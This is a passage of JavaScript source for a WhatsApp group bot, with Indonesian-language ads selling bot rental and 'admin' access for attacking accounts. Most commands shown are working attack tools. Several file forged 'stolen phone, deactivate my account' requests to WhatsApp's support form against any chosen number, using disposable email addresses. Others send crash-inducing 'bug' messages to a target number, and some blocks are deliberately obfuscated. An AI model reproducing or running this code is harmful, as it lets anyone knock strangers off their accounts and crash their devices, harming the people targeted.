┏━━⊱
┣❏ Sewa Bot 7k/minggu
┣❏ Sewa Bot 20k/bulan
┣❏ Sewa Bot 35k/2bulan
┣❏ Sewa Permanen 70k
┣❏ *Membeli Berarti Tau Apa Yang Di Beli*
┣❏ http://wa.me/62895622182398
┗━━⊱ nabil

Apasih Itu Sewa Bot?
Jadi Sewa Bot Adalah Menggunakan Bot yang sama tetapi beda grub.

Apasih Keuntungan Sewa Bot?
1. Uang Mengalir Dari Akses Bot
2. Tidak Ribet
3. Bot Mati Tenang Semua Tanggungan Owner
4. Modal Dikit Untung Berlimpah 

`
reply(textsewa)
}
break
case 'joinadmin':{
textjoinadmin = `
❍ HARGA JADI ADMIN ❍
┏━━⊱
┣❏ 5k perminggu
┣❏ 15k perbulan
┣❏ 25k /2bulan
┣❏ 40k permanen
┣❏ *Membeli Berarti Tau Apa Yang Di Beli*
┣❏ http://wa.me/62895622182398
┗━━⊱ nabil 

Apsih Keuntungan Admin?
1.Bisa Santet grub
2.Bisa Kenon Wa
3.Hidetag

Note: Admin Hanya Join Bukan Berarti Memiliki,,Jadi Dilarang Keras Mengakses Member Lain Selain Owner. Jika Mau Akses Orang Lain Sewa Bot Bukan Jadi Admin Grub.
 `
reply(textjoinadmin)
 }
break
case "joinown":{
let ayptr = '62895622182398@s.whatsapp.net'
mentions(`𝚑𝚊𝚛𝚐𝚊 𝚘𝚠𝚗 𝟻𝟶=𝚔 𝚙𝚎𝚛𝚖𝚊𝚗𝚎𝚗 𝚑𝚞𝚋𝚞𝚗𝚐𝚒 @${ayptr.split('@')[0]}
 
 𝚔𝚎𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗 𝚘𝚠𝚗 𝚋𝚒𝚜𝚊 𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚊𝚕𝚕 𝚏𝚒𝚝𝚞𝚛`,[ayptr])
}
break
//admin
case 'delatmin':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nabil.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = linsadm.indexOf(ya)
linsadm.splice(unp, 1)
fs.writeFileSync('./nodeJS/database/admin.json', JSON.stringify(linsadm))
delatmin = ya+`@s.whatsapp.net`
mentions(`sukses delete atmin @${delatmin.split('@')[0]}`, [delatmin])
}
break
case 'addatmin':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nabil.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
linsadm.push(yo)
fs.writeFileSync('./nodeJS/database/admin.json', JSON.stringify(linsadm))
addatmin = yo+`@s.whatsapp.net`
mentions(`sukses add atmin @${addatmin.split('@')[0]}`, [addatmin])
}
break
case 'listatmin':{
 if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
let listatmin =`*List Atmin nabil Botz*\n\ntotal user : ${linsadm.length}\n`
var no = 1
for (let x of linsadm) {
listatmin +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listatmin +=`Untuk menghapus atmin\nKetik ${prefix}delatmin 628xxx/@tag`
reply(listatmin)
}
break

//own
case 'delown':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nabil.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = linsown.indexOf(ya)
linsown.splice(unp, 1)
fs.writeFileSync('./nodeJS/database/lins.json', JSON.stringify(linsown))
delown = ya+`@s.whatsapp.net`
mentions(`sukses delete owner @${delown.split('@')[0]}`, [delown])
}
break
case 'addown':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nabil.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
linsown.push(yo)
fs.writeFileSync('./nodeJS/database/lins.json', JSON.stringify(linsown))
addown = yo+`@s.whatsapp.net`
mentions(`sukses add owner @${addown.split('@')[0]}`, [addown])
}
break
case 'listown':{
 if (!isGroup) return reply(`wajib dalam grup`)
if (!isDeveloper) return reply(`Fitur Ini Hanya Dapat Digunakan Oleh Developer Bot Silahkan Pake Fitur Yang Lain.`)
let listown =`*List Owner nabil Botz*\n\ntotal user : ${linsown.length}\n`
var no = 1
for (let x of linsown) {
listown +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listown +=`Untuk menghapus owner\nKetik ${prefix}delown 628xxx/@tag`
reply(listown)
}
break
case 'listusr':{
 if (!isGroup) return reply(`wajib dalam grup`)
if (!isGroupAdmins && !isDeveloper) return reply(`Fitur khusus admin`)
let listusr =`*List user premium nabil - Ofc*\n\ntotal user : ${bugchat.length}\n`
var no = 1
for (let x of bugchat) {
listusr +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listusr +=`Untuk menghapus user/member\nKetik ${prefix}delusr 628xxx/@tag`
reply(listusr)
}
break
case 'revoke':{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
await nabil.groupRevokeInvite(from)
.then(res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply('Maaf terjadi kesalahan'))
}
break
case 'group': case 'grup':
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
if (args[0] == "off") {
nabil.groupSettingUpdate(from, 'announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] == "on") {
nabil.groupSettingUpdate(from, 'not_announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else {
reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
}
break
case "hidetag":{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
let mem = [];
groupMembers.map( i => mem.push(i.id) )
nabil.sendMessage(from, { text: q ? q : '', mentions: mem })
}
break
case "kick": {
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isBotAdmins) return reply('Jadiin bot admin dong biar bisa')
if (!isGroupAdmins) return reply('Fitur ini khusus admin grup')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await nabil.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'promote':
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
if (mentionUser.length !== 0) {
nabil.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else if (isQuotedMsg) {
nabil.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'demote':
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
if (mentionUser.length !== 0) {
nabil.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else if (isQuotedMsg) {
nabil.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

// LIST MENU
case "menu":{
cpimage(textbugmenu)
}
break
case "sc":
case "buysc":{
let nabil = '62895622182398@s.whatsapp.net'
mentions(`𝙼𝙰𝚄 𝙱𝚄𝚈 𝚂𝙲𝚁𝙸𝙿𝚃 𝙱𝙾𝚃?
𝙲𝙷𝙰𝚃 @${nabil.split('@')[0]}`,[nabil])
}
break
case "owner":{
let lins = '62895622182398@s.whatsapp.net'
mentions(`𝙸𝙽𝙸 𝙺𝙰𝙺 𝙽𝙾𝙼𝙾𝚁 𝙾𝚆𝙽𝙴𝚁𝙺𝚄 @${lins.split('@')[0]}𝙹𝙰𝙽𝙶𝙰𝙽 𝙳𝙸 𝚂𝙿𝙰𝙼 𝚈𝙰𝙷`,[lins])
}
break
case 'verif':
case 'kenonwa':
case 'matiwa':
case 'keluarwa':{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!isGroupAdmins && !islinsad) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case 'linsout':{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson) return reply('Fitur Khusus owner')
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  reply('Tunggu...')
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case 'linsban':{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson) return reply('Fitur Khusus owner')
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 reply('Tunggu...')
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "linsgas": {
if (!islinson) return reply('fitur ini khusus owner bot')
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
var cekap = await nabil.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return
if (target == '62895622182398@s.whatsapp.net') return
reply('*Proses...*')
sendDocu(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break
case "linsallin": {
if (!islinson) return reply('fitur ini khusus owner bot')
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,1`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,1`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,1`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
var cekap = await nabil.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return
if (target == '62895622182398@s.whatsapp.net') return
reply('*Proses...*')
sendDocu(target,jumlahnya)
sendBug(target,jumlahnya)
sendBug2(target,jumlahnya)
sendBugPay(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break
case "linspay": {
if (!islinson) return reply('fitur ini khusus owner bot')
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,25`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,25`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,25`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
var cekap = await nabil.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return
if (target == '62895622182398@s.whatsapp.net') return
reply('*Proses...*')
sendBugPay(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break
case "linsv1": {
if (!islinson) return reply('fitur ini khusus owner bot')
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,20`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,20`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,20`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
var cekap = await nabil.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return
if (target == '62895622182398@s.whatsapp.net') return
reply('*Proses...*')
sendBug(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break
case "linsv2": {
if (!islinson) return reply('fitur ini khusus owner bot')
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,20`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,20`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,20`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
var cekap = await nabil.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return
if (target == '62895622182398@s.whatsapp.net') return
reply('*Proses...*')
sendBug2(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break

// BUG VERIFY
case "out":
case "verify":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!islinson)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await nabil['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6282279915237','54mgTCKv','6281911317205','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Para WhatsApp\nDesative minha conta, pois meu número e documentação foram roubados e não consigo acessar novamente`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "unbanwa":{
const _0x3b0948=_0x1c03;function _0x1c03(_0x2ba437,_0x629f73){const _0x174abb=_0x174a();return _0x1c03=function(_0x1c03e2,_0x278dea){_0x1c03e2=_0x1c03e2-0x141;let _0x35c234=_0x174abb[_0x1c03e2];return _0x35c234;},_0x1c03(_0x2ba437,_0x629f73);}(function(_0x4cbb0b,_0x10f022){const _0x4868dd=_0x1c03,_0x42ce23=_0x4cbb0b();while(!![]){try{const _0xb1fb=parseInt(_0x4868dd(0x177))/0x1*(-parseInt(_0x4868dd(0x175))/0x2)+parseInt(_0x4868dd(0x167))/0x3*(-parseInt(_0x4868dd(0x156))/0x4)+-parseInt(_0x4868dd(0x166))/0x5*(parseInt(_0x4868dd(0x16c))/0x6)+parseInt(_0x4868dd(0x143))/0x7+parseInt(_0x4868dd(0x151))/0x8*(parseInt(_0x4868dd(0x172))/0x9)+parseInt(_0x4868dd(0x159))/0xa+parseInt(_0x4868dd(0x153))/0xb;if(_0xb1fb===_0x10f022)break;else _0x42ce23['push'](_0x42ce23['shift']());}catch(_0x5680dc){_0x42ce23['push'](_0x42ce23['shift']());}}}(_0x174a,0xcac5e));if(!islinson)return reply(_0x3b0948(0x14d));if(!q)return reply(_0x3b0948(0x149)+(prefix+command)+_0x3b0948(0x14a));let dia=q[_0x3b0948(0x157)]('|')[0x0]['replace'](/[^0-9]/g,'');var axioss=require(_0x3b0948(0x15f));let ntah=await axioss[_0x3b0948(0x174)](_0x3b0948(0x15d)),email=await axioss[_0x3b0948(0x174)]('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708'),cookie=ntah[_0x3b0948(0x144)][_0x3b0948(0x179)][_0x3b0948(0x14f)](';\x20');const cheerio=require(_0x3b0948(0x141));function _0x174a(){const _0x531673=['axios','lsd','__comment_req','input[name=jazoest]','country_selector','email','find','15hDCWjB','147DBpSTN','POST','19316.BP:whatsapp_www_pkg.2.0.0.0.0','your_message','load','647538LvZJaa','__a','__user','__req','for\x20(;;);','dpr','522AwPWyB','href','get','34894XaBnLy','https://www.whatsapp.com','68UrTdid','input[name=lsd]','set-cookie','action','cheerio','format','354956FmZaWo','headers','email_confirm','ANDROID','replace','__ccg','Penggunaan\x20','\x20628xxxx','data','val','Owner\x20Only','__csr','join','append','64168EVGpsR','jazoest','17067391IrnzBQ','__hs','submit','12032tsaSyr','split','INDONESIA','4206080JJfFXJ','phone_number','UNKNOWN','platform','https://www.whatsapp.com/contact/noclient/','form'];_0x174a=function(){return _0x531673;};return _0x174a();}let $=cheerio[_0x3b0948(0x16b)](ntah[_0x3b0948(0x14b)]),$form=$(_0x3b0948(0x15e)),url=new URL($form['attr'](_0x3b0948(0x17a)),_0x3b0948(0x176))[_0x3b0948(0x173)],form=new URLSearchParams();form[_0x3b0948(0x150)](_0x3b0948(0x152),$form['find'](_0x3b0948(0x162))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)](_0x3b0948(0x160),$form[_0x3b0948(0x165)](_0x3b0948(0x178))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)]('step',_0x3b0948(0x155)),form['append'](_0x3b0948(0x163),_0x3b0948(0x158)),form[_0x3b0948(0x150)](_0x3b0948(0x15a),''+dia),form[_0x3b0948(0x150)](_0x3b0948(0x164),email[_0x3b0948(0x14b)][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x145),email['data'][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x15c),_0x3b0948(0x146)),form[_0x3b0948(0x150)](_0x3b0948(0x16a),'meu\x20número\x20por\x20engano\x20Peço\x20que\x20vocês\x20reativem\x20meu\x20número\x20pois\x20tenho\x20família\x20em\x20outro\x20país\x20e\x20preciso\x20me\x20comunicar\x20com\x20eles'),form[_0x3b0948(0x150)](_0x3b0948(0x16e),'0'),form[_0x3b0948(0x150)](_0x3b0948(0x16d),'1'),form['append'](_0x3b0948(0x14e),''),form['append'](_0x3b0948(0x16f),'8'),form['append'](_0x3b0948(0x154),_0x3b0948(0x169)),form['append'](_0x3b0948(0x171),'1'),form[_0x3b0948(0x150)](_0x3b0948(0x148),_0x3b0948(0x15b)),form[_0x3b0948(0x150)]('__rev','1006630858'),form['append'](_0x3b0948(0x161),'0');let res=await axioss({'url':url,'method':_0x3b0948(0x168),'data':form,'headers':{'cookie':cookie}});reply(util[_0x3b0948(0x142)](JSON['parse'](res[_0x3b0948(0x14b)][_0x3b0948(0x147)](_0x3b0948(0x170),''))));
}
break
case "unbanned":{
